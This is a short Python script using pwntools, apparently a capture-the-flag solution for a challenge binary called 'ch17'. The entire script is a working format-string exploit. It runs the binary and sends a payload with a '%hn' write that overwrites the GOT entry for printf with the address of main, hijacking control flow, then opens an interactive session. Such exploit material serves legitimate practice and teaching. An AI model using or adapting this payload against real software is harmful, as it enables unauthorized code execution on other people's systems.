from pwn import*

p = process("./ch17")

printf_got = 0x804a010
main = 0x08048506

payload = b"%34054x%106$hn  " + p32(printf_got)

p.sendline(payload)
p.interactive()
